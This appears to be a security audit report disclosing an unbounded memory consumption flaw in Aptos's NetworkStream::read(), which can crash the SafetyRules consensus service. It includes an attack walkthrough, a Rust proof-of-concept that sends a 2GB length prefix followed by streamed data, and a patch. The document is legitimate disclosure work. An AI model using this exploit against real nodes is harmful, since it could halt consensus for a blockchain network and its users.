# Audit Report

## Title
Unbounded Memory Consumption in NetworkStream::read() Leading to Consensus Denial of Service

## Summary
The `NetworkStream::read()` function in `secure/net/src/lib.rs` lacks validation on the message length prefix, allowing an attacker to specify an arbitrarily large message size (up to 4GB) that causes unbounded buffer growth and memory exhaustion, leading to a crash of critical consensus components like SafetyRules.

## Finding Description

The `NetworkStream::read()` function implements a length-prefixed message protocol where a 4-byte little-endian `u32` specifies the message size. The function contains a critical asymmetry in validation:

**Write path has validation:** [1](#0-0) 

**Read path lacks validation:** [2](#0-1) 

The read loop continuously appends received data to an internal buffer: [3](#0-2) 

**Attack scenario:**

1. Attacker connects to a service using `NetworkStream` (e.g., SafetyRules remote service) [4](#0-3) 

2. Attacker sends malicious length prefix: `[0xFF, 0xFF, 0xFF, 0x7F]` = 2,147,483,647 bytes (2GB)

3. Attacker continuously sends data in chunks (e.g., 1MB every few seconds, staying within the timeout window) [5](#0-4) 

4. The buffer grows unbounded as each chunk is appended [6](#0-5) 

5. The SafetyRules service exhausts available memory and crashes

6. **Consensus loses liveness** - validators cannot make safety decisions, halting block production

The vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

**Severity: High to Critical**

This vulnerability affects the **SafetyRules** consensus component, which is critical for AptosBFT safety guarantees. Per the Aptos bug bounty program:

- **"Total loss of liveness/network availability"** (Critical): If the SafetyRules service crashes, validators cannot produce blocks, causing network-wide consensus failure
- **"Validator node slowdowns"** (High): Memory exhaustion causes performance degradation before complete failure

Unlike the excluded "network-level DoS attacks," this is an **application-layer protocol vulnerability** caused by missing input validation, not network flooding.

The gRPC-based alternative properly enforces size limits: [7](#0-6) 

But the TCP-based `NetworkStream` used by SafetyRules has no such protection.

## Likelihood Explanation

**Likelihood: Medium**

**Attack requirements:**
- Network access to the SafetyRules service port (typically internal, but may be exposed through misconfiguration)
- Ability to send malformed protocol messages

**Mitigating factors:**
- SafetyRules is typically not exposed to the public internet
- Requires persistent connection to accumulate memory

**Aggravating factors:**
- No authentication on the TCP protocol layer
- Simple exploit requiring minimal resources
- Deterministic crash on any system

Even if access is restricted, misconfigurations, insider threats, or lateral movement after partial compromise make this exploitable.

## Recommendation

Add message size validation in `read_buffer()` to match the write-side check:

```rust
fn read_buffer(&mut self) -> Vec<u8> {
    if self.buffer.len() < 4 {
        return Vec::new();
    }

    let mut u32_bytes = [0; 4];
    u32_bytes.copy_from_slice(&self.buffer[..4]);
    let data_size = u32::from_le_bytes(u32_bytes) as usize;

    // ADD THIS CHECK:
    let u32_max = u32::MAX as usize;
    if u32_max <= data_size {
        // Clear buffer and return error indicator
        self.buffer.clear();
        return Vec::new();
    }

    // Or better, enforce a reasonable maximum (e.g., 80MB like gRPC):
    const MAX_MESSAGE_SIZE: usize = 80 * 1024 * 1024;
    if data_size > MAX_MESSAGE_SIZE {
        self.buffer.clear();
        return Vec::new();
    }

    let remaining_data = &self.buffer[4..];
    if remaining_data.len() < data_size {
        return Vec::new();
    }

    let returnable_data = remaining_data[..data_size].to_vec();
    self.buffer = remaining_data[data_size..].to_vec();
    returnable_data
}
```

Additionally, consider enforcing a maximum buffer size to prevent accumulation attacks.

## Proof of Concept

```rust
use std::net::{TcpStream, SocketAddr};
use std::io::Write;
use std::thread;
use std::time::Duration;

fn exploit_memory_exhaustion(target: SocketAddr) {
    let mut stream = TcpStream::connect(target).expect("Failed to connect");
    
    // Send malicious length prefix: 2GB
    let malicious_length: u32 = 0x7FFFFFFF; // 2,147,483,647 bytes
    stream.write_all(&malicious_length.to_le_bytes())
        .expect("Failed to write length");
    
    // Send data in 1MB chunks to stay within timeout
    let chunk = vec![0x41; 1024 * 1024]; // 1MB of 'A'
    
    for i in 0..2048 { // Send up to 2GB
        stream.write_all(&chunk).expect("Failed to write chunk");
        println!("Sent {}MB, target should be consuming memory", i);
        thread::sleep(Duration::from_millis(100));
    }
}

// Run against a test SafetyRules service:
// exploit_memory_exhaustion("127.0.0.1:6191".parse().unwrap());
```

**Expected behavior:** The SafetyRules service will consume increasing memory (visible via `top` or similar) until it crashes with OOM or becomes unresponsive, breaking consensus.

## Notes

While the original security question focused on whether the loop runs "forever until timeout," the actual critical vulnerability is the **unbounded memory consumption** that occurs *before* any timeout. The timeout mechanism does not protect against this attack because the attacker can send data continuously within the timeout window, causing memory to grow without bound.

The vulnerability exists because `read_buffer()` trusts the attacker-controlled length prefix without validation, while `write()` properly validates outbound message sizes. This asymmetry is the root cause.

### Citations

**File:** secure/net/src/lib.rs (L415-419)
```rust
    pub fn new(stream: TcpStream, remote: SocketAddr, timeout_ms: u64) -> Self {
        let timeout = Some(std::time::Duration::from_millis(timeout_ms));
        // These only fail if a duration of 0 is passed in.
        stream.set_read_timeout(timeout).unwrap();
        stream.set_write_timeout(timeout).unwrap();
```

**File:** secure/net/src/lib.rs (L436-450)
```rust
        loop {
            trace!("Attempting to read from stream");
            let read = self.stream.read(&mut self.temp_buffer)?;
            trace!("Read {} bytes from stream", read);
            if read == 0 {
                return Err(Error::RemoteStreamClosed);
            }
            self.buffer.extend(self.temp_buffer[..read].to_vec());
            let result = self.read_buffer();
            if !result.is_empty() {
                trace!("Found a message in the stream");
                return Ok(result);
            }
            trace!("Did not find a message yet, reading again");
        }
```

**File:** secure/net/src/lib.rs (L460-463)
```rust
        let u32_max = u32::MAX as usize;
        if u32_max <= data.len() {
            return Err(Error::DataTooLarge(data.len()));
        }
```

**File:** secure/net/src/lib.rs (L484-486)
```rust
        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;
```

**File:** consensus/safety-rules/src/remote_service.rs (L30-44)
```rust
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, network_timeout_ms: u64) {
    let mut safety_rules = SafetyRules::new(storage, false);
    if let Err(e) = safety_rules.consensus_state() {
        warn!("Unable to print consensus state: {}", e);
    }

    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);

    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```
